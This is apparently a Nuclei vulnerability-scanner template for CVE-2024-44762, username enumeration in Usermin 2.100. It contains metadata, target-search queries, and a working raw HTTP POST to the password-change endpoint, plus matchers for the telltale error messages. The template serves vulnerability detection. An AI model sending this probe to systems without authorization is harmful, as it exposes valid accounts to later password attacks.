id: CVE-2024-44762

info:
  name: Usermin 2.100 - Username Enumeration
  author: ritikchaddha
  severity: medium
  description: |
    Usermin version 2.100 and below is susceptible to username enumeration via the password change functionality. An attacker can determine valid usernames by analyzing the response messages from the password change endpoint.
  remediation: |
    Upgrade to the latest version of Usermin that addresses this vulnerability.
  reference:
    - https://www.exploit-db.com/exploits/52254
    - https://www.webmin.com/usermin.html
    - https://senscybersecurity.nl/cve-2024-44762-explained/
    - https://nvd.nist.gov/vuln/detail/CVE-2024-44762
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cve-id: CVE-2024-44762
    cwe-id: CWE-209
  metadata:
    verified: true
    max-request: 1
    vendor: webmin
    product: usermin
    shodan-query: title:"Usermin"
    fofa-query: app="Usermin"
  tags: cve,cve2024,usermin,webmin,exposure,usernames

http:
  - raw:
      - |
        POST /password_change.cgi HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Referer: {{BaseURL}}/password_change.cgi

        user=admin&pam=&expired=2&old=fakePassword&new1=password&new2=password

    matchers:
      - type: word
        part: body
        words:
          - "Failed to change password: The current password is incorrect"
          - "Your login name was not found in the password file"
        condition: or
# digest: 4a0a00473045022100cb18f37be716c0fe650ef1b87555f4779853c9ab753ff0daf573673f6943666e022055cdf3ee7c0cbd9f22bc82590a6d715bf5b317f42be270b8e6f6f4b99755f548:922c64590222798bb761d5b6d8e72950